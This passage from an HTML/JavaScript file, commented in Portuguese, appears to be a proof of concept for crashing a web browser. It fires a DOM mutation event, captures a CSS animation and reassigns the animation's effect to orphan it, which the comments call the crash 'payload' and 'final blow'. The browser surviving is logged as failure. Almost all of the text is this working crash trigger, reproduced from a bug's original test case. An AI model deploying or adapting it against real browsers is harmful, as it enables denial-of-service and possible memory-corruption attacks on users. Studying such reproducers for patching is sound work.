        /* Apenas define a animação, mas deixa os detalhes para o JS */

    <script>
        const logArea = document.getElementById('log');
        const object = document.getElementById("targetObject");
        const cite = document.getElementById("targetCite");

            object.data = "x";
            
            log(">> Gatilho (object.data) acionado.");
        }

        function subtreeModified() {
            // Se já tivermos sucesso ou falha crítica, para.
            if (attempts > 20) return; 
            attempts++;

            // Tenta pegar a animação
            const animations = cite.getAnimations();

            if (animations.length === 0) {

                log(".. Animação não encontrada. Forçando reflow...");
                void cite.offsetWidth; // Lê propriedade de layout para forçar cálculo
                
                // Tenta definir algo no objeto para redisparar o evento se necessário
                // Mas cuidado para não entrar em loop infinito síncrono
                return; 
            }

            const animation = animations[0];
            log("!!! ANIMAÇÃO CAPTURADA !!!");
            log(">> Executando payload do Crash...");

            // ============================================================
            // O CÓDIGO DO BUG EXATO (Do arquivo original)
            // ============================================================
            
            // 1. Modifica propriedades do objeto dono para sujar o estado
            object.width = "1em";
            
            // 2. Acessa propriedade legada (pode ser gatilho de sincronização)
            // O patch original tem "object.codeBase;" - é apenas um getter.
            let temp = object.codeBase; 

            // 3. O GOLPE FINAL:
            // Troca o efeito para outro elemento (dl).
            // Isso deixa a 'animation' órfã (owningElement vira null).
            // O navegador tenta sincronizar logo em seguida e... CRASH.
            animation.effect = new KeyframeEffect(dl, { });

            log(">> Payload executado. Se você lê isso, o navegador SOBREVIVEU (Fail).");
            
            // Cleanup para não travar a UI se não crashar
            object.removeEventListener("DOMSubtreeModified", subtreeModified);
        }
